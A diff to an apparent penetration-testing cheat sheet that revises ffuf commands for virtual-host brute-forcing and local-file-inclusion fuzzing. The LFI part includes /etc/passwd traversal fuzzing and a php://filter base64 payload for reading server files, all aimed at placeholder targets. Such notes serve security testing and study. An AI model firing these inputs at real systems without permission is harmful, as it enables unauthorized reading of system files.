@@ -79,13 +79,13 @@ ffuf -ic -recursion -recursion-depth 1 -w /usr/share/wordlists/seclists/Discover
 
 ### vHost Brute-Force
 
-**NOTE: watch the SECURE in http`S`**
-
-Just changes HTTP `Host:` header
+Only changes HTTP `Host:` header. Careful with the SECURE in http`S` if the website is not plain HTTP.
 
 ```bash
 # NOTE: filter out by response size since an HTTP response of 200 OK will always be received
-ffuf -ic -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H 'Host: FUZZ.<DOMAIN>' -u http://<TARGET>/ -fs <SIZE>
+ffuf -ic -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -H 'Host: FUZZ.<DOMAIN>' -u http://<TARGET>/ -fs <SIZE>
+
+ffuf -ic -w /usr/share/seclists/Discovery/DNS/services-names.txt:FUZZ -H 'Host: FUZZ.<DOMAIN>' -u http://<TARGET>/ -fs <SIZE>
 
 # Add NEW vHosts to automatically resolve them later
 echo '<IP_ADDR> <VHOST>.<FQDN>' | sudo tee -a /etc/hosts
@@ -159,7 +159,7 @@ Fuzzes a parameter with hundreds of `/etc/passwd` traversal permutations includi
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs <SIZE>
 ```
 
-**For when files is executed instead of being read:**
+**For when files are executed instead of being read:**
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=php://filter/read=convert.base64-encode/resource=FUZZ' -fs <SIZE>
 ```
